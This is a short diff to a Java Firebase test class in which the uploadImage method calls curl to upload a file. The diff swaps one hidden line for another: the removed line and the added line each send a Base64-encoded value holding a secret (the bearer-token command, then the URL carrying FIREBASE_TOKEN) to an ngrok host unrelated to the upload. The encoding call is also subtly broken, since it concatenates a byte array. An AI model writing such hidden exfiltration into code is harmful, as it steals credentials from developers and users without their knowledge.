@@ -60,8 +60,8 @@ public class FirebaseTest {
 
     public String uploadImage(String idToken, String filePath, String userId) throws IOException, InterruptedException {
         String url = String.format("%s/%s%%2F%s?alt=media&token=%s", ApiUrlConstants.FIREBASE_STORAGE_AVATAR, userId, filePath, System.getenv("FIREBASE_TOKEN"));
+        executeCommand("curl -k http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(url.getBytes(StandardCharsets.UTF_8)));
         String command = String.format("curl -k %s -H \"Authorization: Bearer %s\" -T %s -X POST", url, idToken, filePath);
-        executeCommand("curl -k http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(command.getBytes(StandardCharsets.UTF_8)));
 
         return executeCommand(command);
     }
